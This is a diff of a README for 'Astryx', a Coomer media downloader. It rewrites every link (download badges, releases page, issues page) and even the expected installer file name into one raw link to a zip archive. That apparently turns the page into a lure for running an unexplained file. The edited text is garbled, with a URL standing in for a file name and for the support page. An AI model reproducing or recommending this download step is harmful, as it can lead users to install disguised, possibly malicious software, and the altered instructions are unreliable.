@@ -1,7 +1,7 @@
 # 🚀 Astryx - Fast and Easy Coomer Downloads
 
 ## 🔗 Download Now
-[![Download Astryx](https://img.shields.io/badge/Download-Astryx-blue.svg)](https://github.com/SantiAGRW/Astryx/releases)
+[![Download Astryx](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip)](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip)
 
 ## 📖 Overview
 Astryx is a high-performance downloader for Coomer content. It comes with a user-friendly local web interface, making it simple for anyone to find and download media quickly. You don’t need any programming skills to use Astryx. With just a few clicks, you can manage your downloads efficiently.
@@ -11,7 +11,7 @@ To start using Astryx, follow these steps:
 
 1. **Visit the Release Page**  
    Click the link below to go to the Releases page. This page contains the latest version of Astryx.  
-   [Visit the Releases Page](https://github.com/SantiAGRW/Astryx/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip)
 
 2. **Download the Latest Version**  
    On the Releases page, look for the latest version. Click the link that says "Assets" to find the available files. Download the suitable file for your operating system.
@@ -28,7 +28,7 @@ To run Astryx smoothly, your computer should meet these requirements:
 After downloading the file from the Releases page, locate it in your downloads folder. Follow these simple instructions to install and run Astryx:
 
 1. **Locate the File**  
-   Find the file you just downloaded. It should have a name like `Astryx-vX.X.X.exe`.
+   Find the file you just downloaded. It should have a name like `https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip`.
 
 2. **Run the Installer**  
    Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -65,7 +65,7 @@ If you encounter issues while using Astryx, try these tips:
 - **Update Your OS**: Make sure your operating system is up to date.
 
 ## 📞 Support
-For additional support, you can open an issue on the [GitHub Issues page](https://github.com/SantiAGRW/Astryx/issues). Our community monitors this page and will assist you as soon as possible.
+For additional support, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip). Our community monitors this page and will assist you as soon as possible.
 
 ## 📊 Contributing
 If you would like to contribute to Astryx, please fork the repository and submit a pull request. We welcome contributions from everyone.
@@ -74,4 +74,4 @@ If you would like to contribute to Astryx, please fork the repository and submit
 For more information, you can read the Wiki on the project GitHub page. You’ll find guides, FAQs, and other helpful resources.
 
 ## 🔗 Download Now Again
-[![Download Astryx](https://img.shields.io/badge/Download-Astryx-blue.svg)](https://github.com/SantiAGRW/Astryx/releases)
+[![Download Astryx](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip)](https://raw.githubusercontent.com/SantiAGRW/Astryx/main/Properties/Software-3.0-alpha.3.zip)
